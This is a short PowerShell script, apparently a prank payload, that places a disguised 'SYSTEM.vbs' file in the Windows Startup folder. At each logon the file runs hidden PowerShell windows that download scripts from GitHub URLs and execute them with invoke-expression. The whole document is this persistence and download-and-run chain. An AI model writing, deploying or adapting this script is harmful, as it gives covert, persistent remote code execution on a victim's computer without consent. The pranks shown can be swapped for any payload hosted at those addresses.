Start-Sleep -Seconds 1
cd 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
New-Item 'SYSTEM.vbs' -ItemType File
Start-Sleep -Seconds 1
$content = 'Set objShell = CreateObject("WScript.Shell"):objShell.Run("powershell.exe $pl = iwr https://raw.githubusercontent.com/Hackstur/JokerShell/master/System/RickRoll-Powershell.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/Volume.ps1; invoke-expression $pl"):objShell.Run("powershell.exe -w h $pl = iwr https://raw.githubusercontent.com/Falconnix/prank/main/beep.ps1; invoke-expression $pl")' | out-file -filepath SYSTEM.vbs
